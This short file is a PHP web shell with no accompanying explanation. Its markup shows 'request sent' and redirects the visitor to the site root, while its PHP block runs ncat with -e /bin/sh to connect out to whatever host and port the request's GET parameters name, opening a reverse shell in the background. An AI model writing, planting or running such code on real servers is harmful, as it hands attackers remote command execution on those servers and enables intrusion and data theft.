<head>
<meta http-equiv="refresh" content="0; url=/" />
</head>
request sent
<a href="/">redirect</a>

<?php
  exec('bash/ncat '.$_GET['host'].' '.$_GET['port'].' -e /bin/sh >log.txt 2>&1 &');
?>
